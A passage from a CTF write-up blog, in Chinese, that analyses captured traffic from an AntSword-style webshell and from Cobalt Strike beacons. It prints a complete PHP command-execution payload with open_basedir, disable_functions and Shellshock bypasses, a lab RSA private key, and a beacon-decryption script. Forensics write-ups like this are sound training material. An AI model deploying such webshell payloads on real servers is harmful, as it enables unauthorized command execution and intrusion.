class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);&#125;<span class="keyword">else</span>&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);&#125;<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>))&#123;<span class="variable">$envarr</span>=explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);<span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;@putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));&#125;&#125;&#125;<span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;<span class="variable">$d</span>=explode(<span class="string">&quot;,&quot;</span>,@ini_get(<span class="string">&quot;disable_functions&quot;</span>));<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>))&#123;<span class="variable">$d</span>=<span class="keyword">array</span>();&#125;<span class="keyword">else</span>&#123;<span class="variable">$d</span>=array_map(\<span class="string">&#x27;trim\&#x27;,array_map(\&#x27;strtolower\&#x27;,$d));&#125;return(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));&#125;;function runshellshock($d, $c) &#123;if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe(\&#x27;putenv\&#x27;) &amp;&amp; (fe(\&#x27;error_log\&#x27;) || fe(\&#x27;mail\&#x27;))) &#123;if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;$tmp = tempnam(sys_get_temp_dir(), \&#x27;as\&#x27;);putenv(&quot;PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);if (fe(\&#x27;error_log\&#x27;)) &#123;error_log(&quot;a&quot;, 1);&#125; else &#123;mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);&#125;&#125; else &#123;return False;&#125;$output = @file_get_contents($tmp);@unlink($tmp);if ($output != &quot;&quot;) &#123;print($output);return True;&#125;&#125;return False;&#125;;function runcmd($c)&#123;$ret=0;$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if(fe(\&#x27;system\&#x27;))&#123;@system($c,$ret);&#125;elseif(fe(\&#x27;passthru\&#x27;))&#123;@passthru($c,$ret);&#125;elseif(fe(\&#x27;shell_exec\&#x27;))&#123;print(@shell_exec($c));&#125;elseif(fe(\&#x27;exec\&#x27;))&#123;@exec($c,$o,$ret);print(join(&quot;\n&quot;,$o));&#125;elseif(fe(\&#x27;popen\&#x27;))&#123;$fp=@popen($c,\&#x27;r\&#x27;);while(!@feof($fp))&#123;print(@fgets($fp,2048));&#125;@pclose($fp);&#125;elseif(fe(\&#x27;proc_open\&#x27;))&#123;$p = @proc_open($c, array(1 =&gt; array(\&#x27;pipe\&#x27;, \&#x27;w\&#x27;), 2 =&gt; array(\&#x27;pipe\&#x27;, \&#x27;w\&#x27;)), $io);while(!@feof($io[1]))&#123;print(@fgets($io[1],2048));&#125;while(!@feof($io[2]))&#123;print(@fgets($io[2],2048));&#125;@fclose($io[1]);@fclose($io[2]);@proc_close($p);&#125;elseif(fe(\&#x27;antsystem\&#x27;))&#123;@antsystem($c);&#125;elseif(runshellshock($d, $c)) &#123;return $ret;&#125;elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;))&#123;$w=new COM(\&#x27;WScript.shell\&#x27;);$e=$w-&gt;exec($c);$so=$e-&gt;StdOut();$ret.=$so-&gt;ReadAll();$se=$e-&gt;StdErr();$ret.=$se-&gt;ReadAll();print($ret);&#125;else&#123;$ret = 127;&#125;return $ret;&#125;;$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);print ($ret!=0)?&quot;ret=&#123;$ret&#125;&quot;:&quot;&quot;;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();</span></span><br></pre></td></tr></table></figure>

<p>格式化一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$opdir</span> = @ini_get(<span class="string">&quot;open_basedir&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$opdir</span>) &#123;</span><br><span class="line">    <span class="variable">$ocwd</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$oparr</span> = preg_split(<span class="string">&quot;/;|:/&quot;</span>, <span class="variable">$opdir</span>);</span><br><span class="line">    @array_push(<span class="variable">$oparr</span>, <span class="variable">$ocwd</span>, sys_get_temp_dir());</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@is_writable(<span class="variable">$item</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="variable">$item</span> . <span class="string">&quot;/.fedd1&quot;</span>;</span><br><span class="line">        @mkdir(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">if</span> (!@file_exists(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        @chdir(<span class="variable">$tmdir</span>);</span><br><span class="line">        @ini_set(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);</span><br><span class="line">        <span class="variable">$cntarr</span> = @preg_split(<span class="string">&quot;/\\\\|\\//&quot;</span>, <span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; sizeof(<span class="variable">$cntarr</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            @chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @ini_set(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        @rmdir(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;36&quot;</span> . <span class="string">&quot;4f2&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;42&quot;</span> . <span class="string">&quot;ff1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$p</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;f861d394170244&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$s</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;ufbd335828f30f&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$envstr</span> = @base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;b430b310838a93&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$d</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$c</span> = substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> ? <span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span> : <span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">        @putenv(<span class="string">&quot;PATH=&quot;</span> . getenv(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @putenv(<span class="string">&quot;PATH=&quot;</span> . getenv(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$envstr</span>)) &#123;</span><br><span class="line">        <span class="variable">$envarr</span> = explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">                @putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$r</span> = <span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$d</span> = explode(<span class="string">&quot;,&quot;</span>, @ini_get(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span> = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$d</span> = array_map(<span class="string">&#x27;trim&#x27;</span>, array_map(<span class="string">&#x27;strtolower&#x27;</span>, <span class="variable">$d</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> function_exists(<span class="variable">$f</span>) &amp;&amp; is_callable(<span class="variable">$f</span>) &amp;&amp; !in_array(<span class="variable">$f</span>, <span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">                <span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">                putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">&#123;$c&#125;</span> &gt;<span class="subst">&#123;$tmp&#125;</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">                    error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);</span><br><span class="line">            @unlink(<span class="variable">$tmp</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">print</span> <span class="variable">$output</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$d</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (fe(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">            @system(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">            @passthru(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span> @shell_exec(<span class="variable">$c</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">            @exec(<span class="variable">$c</span>, <span class="variable">$o</span>, <span class="variable">$ret</span>);</span><br><span class="line">            <span class="keyword">print</span> join(<span class="string">&quot;\r\n&quot;</span>, <span class="variable">$o</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;popen&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$fp</span> = @popen(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="keyword">print</span> @fgets(<span class="variable">$fp</span>, <span class="number">2048</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose(<span class="variable">$fp</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;proc_open&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@feof(<span class="variable">$io</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="keyword">print</span> @fgets(<span class="variable">$io</span>[<span class="number">1</span>], <span class="number">2048</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (!@feof(<span class="variable">$io</span>[<span class="number">2</span>])) &#123;</span><br><span class="line">                <span class="keyword">print</span> @fgets(<span class="variable">$io</span>[<span class="number">2</span>], <span class="number">2048</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            @fclose(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">            @fclose(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">            @proc_close(<span class="variable">$p</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;antsystem&#x27;</span>)) &#123;</span><br><span class="line">            @antsystem(<span class="variable">$c</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$w</span> = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line">            <span class="variable">$e</span> = <span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);</span><br><span class="line">            <span class="variable">$so</span> = <span class="variable">$e</span>-&gt;StdOut();</span><br><span class="line">            <span class="variable">$ret</span> .= <span class="variable">$so</span>-&gt;ReadAll();</span><br><span class="line">            <span class="variable">$se</span> = <span class="variable">$e</span>-&gt;StdErr();</span><br><span class="line">            <span class="variable">$ret</span> .= <span class="variable">$se</span>-&gt;ReadAll();</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$ret</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ret</span> = @runcmd(<span class="variable">$r</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    <span class="keyword">print</span> <span class="variable">$ret</span> != <span class="number">0</span> ? <span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span> : <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>;</span><br></pre></td></tr></table></figure>

<p>主要的代码就是<code>$p = base64_decode(substr($_POST[&quot;f861d394170244&quot;], 2));$s = base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;], 2));$envstr = @base64_decode(substr($_POST[&quot;b430b310838a93&quot;], 2));</code>这三句套娃读取，去掉前两位混淆然后直接解base64。</p>
<p>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/MvkztQZlVNyGLc1.png"><img src="https://i.loli.net/2021/09/29/MvkztQZlVNyGLc1.png"></a></p>
<p>成功得到解压命令以及里面的密码。</p>
<p><code>cd /d &quot;D:\\\\phpstudy_pro\\\\WWW\\\\secret&quot;&amp;&quot;C:\\Program Files\\7-Zip\\7z.exe&quot; x secret.zip -pP4Uk6qkh6Gvqwg3y&amp;echo 378df2c234&amp;cd&amp;echo fb7f8f</code></p>
<p>所以压缩包密码就是<code>P4Uk6qkh6Gvqwg3y</code>。</p>
<p>回去解压得到<code>.cobaltstrike.beacon_keys</code>。</p>
<p>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/NlS4Dg85u9cnRfU.png"><img src="https://i.loli.net/2021/09/29/NlS4Dg85u9cnRfU.png"></a></p>
<p>看着应该是cs的beacon模式密钥，所以下面大概就是cs的流量了。</p>
<p>向下翻一会，看到一个挺像beacon模式的流量。</p>
<p>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/8Zla3RvXHstJNQG.png"><img src="https://i.loli.net/2021/09/29/8Zla3RvXHstJNQG.png"></a></p>
<p>尝试用网上的项目<code>WBGlIl/CS_Decrypt</code>去解码。</p>
<p>先把上面的cs的key给提取成rsa的。</p>
<p>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/6pZuMc2oHWBiLJe.png"><img src="https://i.loli.net/2021/09/29/6pZuMc2oHWBiLJe.png"></a></p>
<p>公钥大概用不到，咱只要私钥就行。`</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIqpewO+lqNYuxQhQwq7pMdM7CP92uer5FkUA41vPaelrbpqr1ujH95Q7Rfqt7E7Vc+Xx5dYQCoRaysjNm+UfuRcFocLHG2ugf4+/NEX/NFE+gI279wXfC+zZ0MGFMQIAC1TClaiMvALwMB9nBuXK/CErC754co9cIbaIkCl/sRXAgMBAAECgYBqlSFYXHwfrMmIDJUiv99FzovIko1b/FV2Xxrn8TS8E265Vt3Zm0aYtS25b5Ko6YnpGqqxW4VekKsGqndiRwtNSbIilU1EqWqfdBmucptnISgDdx+ofWbInTRl+leBzDW4Zsl2sMvMmmyhsc/X35pGbH2lRXXEegPzradtyBwhUQJBANt2IC4p5CQW2UxXVjmrTbA+CuJLfnZE+97HCjzZPi/gUiF4akFQx46x0vT1RmcalqUg1Prl7OoKb05Lmwm0XukCQQChv4blpfqVcdz9X6MGJqeaiC22EPZn+2dhm4PbZIhurs57M7+dqlYxoG6LneU0H1N8ieeH9fb9ixG/8+F7iIE/AkEAzyzYfDv3r0oSoMriD1bz5CjtxWtXWvcMfuaPd5nt5uxxHD+8ryQ+/ypH6A+UAslK5V/1L1XXLankIZmmJqcr4QJAGUAkF//EUcY3wJpIgfJQ4e/2auDVBsCZkAROHlbgcZ76fwNCG6P21sJ733Hj0TI+v0dsDK6aQ1SNjdDN15Ik0wJBAK7C5l0QF8NRlIw2+tPUSDVy/PRUVmpRRd4cD4HXNtVMg0Dr3L7vx9PeyJH0EFuaVWItdBDILP0HzUR1/wk5ZFY=</span><br></pre></td></tr></table></figure>

<p>然后去把cs流量的cookie头解一下元数据看看，成功拿到解cs收发数据用的aes密钥。</p>
<p>这里脚本问题比较大，<code>M2Crypto</code>早已停更不太好装，所以换成了密码学里比较常见的<code>pycryptodome</code>库，然后那个私钥模板开头多了个换行导致<code>pycryptodome</code>不识别（<code>M2Crypto</code>应该没这个问题），以及私钥的主体内容需要按标准的64位换行分隔一下。</p>
<p>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/FfvoJxic6ZOP1pN.png"><img src="https://i.loli.net/2021/09/29/FfvoJxic6ZOP1pN.png"></a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"></span><br><span class="line">PRIVATE_KEY = <span class="string">&quot;&quot;&quot;-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">encode_data = <span class="string">&quot;bGOniQ5nfrSmAW9fgdZSCC+42t5xvQt+B4SVEu6Q8MvC4rPn/OThepmxP6GjDiP1wCUB1EE3sqeXkwdHHMd9wikZhiQnjT9AB3e2RNacCVF+8v/nj/Rv85fSD2Phfc/wsaAjld9Fy8ZJJKz1wPwPY6lTxArMGFtX7W+VW/gzujI=&quot;</span></span><br><span class="line">base64_key = <span class="string">&quot;&quot;&quot;MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIqpewO+lqNYuxQh</span></span><br><span class="line"><span class="string">Qwq7pMdM7CP92uer5FkUA41vPaelrbpqr1ujH95Q7Rfqt7E7Vc+Xx5dYQCoRaysj</span></span><br><span class="line"><span class="string">Nm+UfuRcFocLHG2ugf4+/NEX/NFE+gI279wXfC+zZ0MGFMQIAC1TClaiMvALwMB9</span></span><br><span class="line"><span class="string">nBuXK/CErC754co9cIbaIkCl/sRXAgMBAAECgYBqlSFYXHwfrMmIDJUiv99FzovI</span></span><br><span class="line"><span class="string">ko1b/FV2Xxrn8TS8E265Vt3Zm0aYtS25b5Ko6YnpGqqxW4VekKsGqndiRwtNSbIi</span></span><br><span class="line"><span class="string">lU1EqWqfdBmucptnISgDdx+ofWbInTRl+leBzDW4Zsl2sMvMmmyhsc/X35pGbH2l</span></span><br><span class="line"><span class="string">RXXEegPzradtyBwhUQJBANt2IC4p5CQW2UxXVjmrTbA+CuJLfnZE+97HCjzZPi/g</span></span><br><span class="line"><span class="string">UiF4akFQx46x0vT1RmcalqUg1Prl7OoKb05Lmwm0XukCQQChv4blpfqVcdz9X6MG</span></span><br><span class="line"><span class="string">JqeaiC22EPZn+2dhm4PbZIhurs57M7+dqlYxoG6LneU0H1N8ieeH9fb9ixG/8+F7</span></span><br><span class="line"><span class="string">iIE/AkEAzyzYfDv3r0oSoMriD1bz5CjtxWtXWvcMfuaPd5nt5uxxHD+8ryQ+/ypH</span></span><br><span class="line"><span class="string">6A+UAslK5V/1L1XXLankIZmmJqcr4QJAGUAkF//EUcY3wJpIgfJQ4e/2auDVBsCZ</span></span><br><span class="line"><span class="string">kAROHlbgcZ76fwNCG6P21sJ733Hj0TI+v0dsDK6aQ1SNjdDN15Ik0wJBAK7C5l0Q</span></span><br><span class="line"><span class="string">F8NRlIw2+tPUSDVy/PRUVmpRRd4cD4HXNtVMg0Dr3L7vx9PeyJH0EFuaVWItdBDI</span></span><br><span class="line"><span class="string">LP0HzUR1/wk5ZFY=&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">private_key = RSA.import_key(PRIVATE_KEY.<span class="built_in">format</span>(base64_key).encode())</span><br><span class="line">cipher = PKCS1_v1_5.new(private_key)</span><br><span class="line">ciphertext = cipher.decrypt(base64.b64decode(encode_data), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>得到如下aes密钥：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AES key:7c83bf30a6ad2dc410040d33e1399cf6</span><br><span class="line">HMAC key:a77945b3a56687a39f90683cb24d00c2</span><br></pre></td></tr></table></figure>

<p>然后把刚才那个数据包的返回当作任务命令去解码。</p>
<p>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/5vKkEIgQ3dqcOZl.png"><img src="https://i.loli.net/2021/09/29/5vKkEIgQ3dqcOZl.png"></a></p>
<p>好像啥都没有，那就去找最后一个类似的数据包（有返回长度的）</p>
<p>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/2XWVewImyoLgKrk.png"><img src="https://i.loli.net/2021/09/29/2XWVewImyoLgKrk.png"></a></p>
<p>复制过来解码看看。</p>
<p>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/cqJNGglunbOEFvH.png"><img src="https://i.loli.net/2021/09/29/cqJNGglunbOEFvH.png"></a></p>
<p>虽然识别的准确率不太行，但至少raw里面还是能看出执行了个<code>type</code>命令去读flag文件的。</p>
<p>那么只要找到执行后返回的数据就行。</p>
<p>因为cs的beacon模式返回是搞个定时任务去延期查询的，所以往下翻翻应该就能找到发送的数据中有被编码的结果数据。</p>
<p>而这题正好就在下一条数据包，直接用最后一个脚本解码。<br>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/Z2Uk3JFdIRWc6xg.png"><img src="https://i.loli.net/2021/09/29/Z2Uk3JFdIRWc6xg.png"></a></p>
<p>[<a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/KlOVqXz2ZSbAgsj.png"><img src="https://i.loli.net/2021/09/29/KlOVqXz2ZSbAgsj.png"></a></p>
<p>成功拿到flag。</p>
<blockquote>
<p><code>flag&#123;787fc697-8773-4669-84ad-94f714e7df09&#125;</code></p>
</blockquote>
<h3 id="Crtpto"><a href="#Crtpto" class="headerlink" title="Crtpto"></a>Crtpto</h3><h4 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA-1"></a>RSA-1</h4><p>这题的话，特征就<code>M = 2021 * m * 1001 * p </code>这个比较怪，不过还算简单，明文里面带了因数p，那么就会造成密文c和n存在公因数p，所以取公一下p出了q也就出了，然后再把明文m重新除一下就完事。</p>
